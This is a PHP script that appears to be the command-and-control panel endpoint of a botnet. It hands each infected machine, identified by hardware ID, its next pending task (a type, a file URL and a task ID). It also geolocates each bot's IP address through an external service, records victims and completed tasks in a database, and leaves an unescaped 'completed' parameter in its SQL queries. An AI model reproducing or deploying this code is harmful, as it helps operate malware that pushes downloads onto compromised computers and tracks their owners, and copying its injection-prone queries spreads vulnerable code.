<?php
error_reporting(0);
include("config.php");


	 $hwid = mysqli_real_escape_string($condb,$_GET['hwid']);
	 $completed = $_GET['completed'];
	 
	 
	 
	 if(isset($hwid)){
		 
		 //mysqli_query(
		$tasks = mysqli_query($condb,"SELECT * FROM `tasks`");
        for ($x = 0; $x < mysqli_num_rows($tasks); $x++){
            $task = mysqli_fetch_assoc($tasks);
            if(mysqli_num_rows(mysqli_query($condb,"SELECT * FROM `completed` WHERE `hwid`='$hwid' AND `task_id`='".$task['task_id']."'")) < 1){
				

			
			 $data = array('type' => $task['task_type'], 'URL' => $task['url_file'], 'ID_task' => $task['task_id']);
            // header('Content-type: text/javascript');
			 $response = json_encode($data , JSON_UNESCAPED_SLASHES);
			 
					
			//$response .= $task['task_type'].";".$task['url_file'].";".$task['task_id']."|";
			break;	
				
			}

        }

        echo $response;
		 
		 
		        $d = date('Y/m/d h:i:s a', time());
		        $loc = json_decode(file_get_contents('http://ip-api.com/json/'.$_SERVER['REMOTE_ADDR']), true);
			    $c = $loc['countryCode'];
				mysqli_query($condb,"UPDATE `bot` SET `Date_Time`='$d', `Country`='$c' ,`IP`='".$_SERVER['REMOTE_ADDR']."' WHERE `HWID`='$hwid'"); 

		 
	 }


     if(isset($hwid) && isset($completed)){

                    if (!preg_match("/^[-a-zA-Z-0-9]*$/",$hwid)) {
                                        
                        echo  "Go Fuck yourself :v ";
                        
                        // exit();
                        
                    }else{



                    $check1 = mysqli_query($condb,"SELECT * FROM `completed` WHERE `hwid`='$hwid' AND `task_id`='$completed'");
					if(mysqli_num_rows($check1) < 1){
						
                    $sql = "INSERT INTO `completed`(`hwid`, `task_id`) VALUES ('$hwid', '$completed')";
                    $query_ok = mysqli_query($condb,$sql);	
					
					}


                }
				
	 }









?>